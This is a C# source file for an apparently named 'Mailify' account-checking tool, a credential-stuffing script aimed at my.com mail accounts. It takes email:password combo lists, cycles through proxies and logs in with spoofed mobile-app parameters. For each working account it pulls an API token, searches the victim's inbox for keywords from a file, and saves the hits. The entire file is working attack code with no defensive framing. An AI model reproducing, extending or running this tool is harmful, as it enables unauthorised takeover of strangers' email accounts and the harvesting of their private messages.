using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Mailaccess_Scan
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Inbox_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));



                    var site = WebUtility.UrlDecode("https://aj-https.my.com/cgi-bin/auth?timezone=GMT+2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOSÂ¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad 2;(WiFi)&simple=1&Login=" + credentials[0] + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&Password=" + credentials[1] + "&device_vendor=Apple&mob_json=1&DeviceInfo={\"Timezone\":\"GMT+2\",\"OS\":\"iOS 9.2\",?\"AppVersion\":\"4.2.0.12436\",\"DeviceName\":\"iPad\",\"Device?\":\"Apple iPad 2;(WiFi)\"}&device_name=iPad&");
                    req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                    req.AddHeader("Pragma", "no-cache");
                    req.AddHeader("Accept", "*/*");

                    var res0 = req.Get("" + site + "");
                    string text0 = res0.ToString();

                    if (text0.Contains("Ok=1"))
                    {
                        var site2 = WebUtility.UrlDecode("https://aj-https.my.com/api/v1/tokens?email=" + credentials[0] + "&mp=android&mmp=mail&DeviceID=b915df62e3c1dee109e71b47c28f156b&client=mobile&udid=1b1f390dc8898c3caff164a55f5bc91619ab15d5fa8d9287dc335bfd9e09abd6&instanceid=cRYT1qjfiKE&playservices=202614037&connectid=9d4527fca2ee1717352c7dfd339a86a8&os=Android&os_version=10&ver=com.my.mail12.8.0.30440&appbuild=30440&vendor=Xiaomi&model=MI 8 Lite&device_type=Smartphone&country=BR&language=pt_BR&timezone=GMT-03:00&device_name=Xiaomi MI 8 Lite&idfa=142b1b43-88ee-4a6e-9b84-0472623d63b5&appsflyerid=1596761345723-8129751771213333860&current=google&first=google&md5_signature=feff7cbcf5bd717fbf3dedc617a0adbf");
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");

                        var res1 = req.Get("" + site2 + "");
                        string text1 = res1.ToString();

                        var token = Functions.JSON(text1, "token").FirstOrDefault();

                        try
                        {
                            foreach (string keyword in File.ReadAllLines("Files//Keywords.txt"))
                            {
                                var site3 = WebUtility.UrlDecode("https://aj-https.my.com/api/v1/messages/search?htmlencoded=false&limit=1&offset=0&query=" + keyword + "&snippet_limit=277&with_threads=true&email=" + credentials[0] + "&mp=android&mmp=mail&DeviceID=b915df62e3c1dee109e71b47c28f156b&client=mobile&udid=1b1f390dc8898c3caff164a55f5bc91619ab15d5fa8d9287dc335bfd9e09abd6&instanceid=cRYT1qjfiKE&playservices=202614037&connectid=9d4527fca2ee1717352c7dfd339a86a8&os=Android&os_version=10&ver=com.my.mail12.8.0.30440&appbuild=30440&vendor=Xiaomi&model=MI 8 Lite&device_type=Smartphone&country=BR&language=pt_BR&timezone=GMT-03:00&device_name=Xiaomi MI 8 Lite&idfa=142b1b43-88ee-4a6e-9b84-0472623d63b5&device_year=2014&connection_class=UNKNOWN&current=google&first=google&behaviorName=default+stickers&appsflyerid=1596761345723-8129751771213333860&reqmode=fg&ExperimentID=Experiment_simple_signin&isExperiment=false&token=" + token + "&md5_signature=efb24052d8bed655df0e291e3c5af6dc");
                                req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                                req.AddHeader("Pragma", "no-cache");
                                req.AddHeader("Accept", "*/*");
                                var res2 = req.Get("" + site3 + "");
                                string text2 = res2.ToString();
                                var count = Functions.JSON(text2, "count").FirstOrDefault();
                                if (count == null || count == "0")
                                {
                                    Variables.Custom++;
                                    Variables.Checked++;
                                    Variables.cps++;
                                    lock (Variables.WriteLock)
                                    {
                                        Variables.remove(combo);
                                        File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                                    }
                                }
                                else
                                {
                                    Variables.Valid++;
                                    Variables.Checked++;
                                    Variables.cps++;
                                    lock (Variables.WriteLock)
                                    {
                                        Variables.remove(combo);
                                        if (Config.kekr_UI == "LOG")
                                        {
                                            Console.WriteLine($"[+] " + combo + " | Keyword: " + keyword + " | Results: " + count, Color.Green);
                                        }
                                        File.AppendAllText(Variables.results + $"{keyword}.txt", combo + " | Keyword: " + keyword + " | Results: " + count + Environment.NewLine);
                                    }
                                }

                            }
                        }
                        catch
                        {
                            Variables.Custom++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                                File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                            }
                        }
                    }
                    else if (text0.Contains("Ok=0"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }

                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}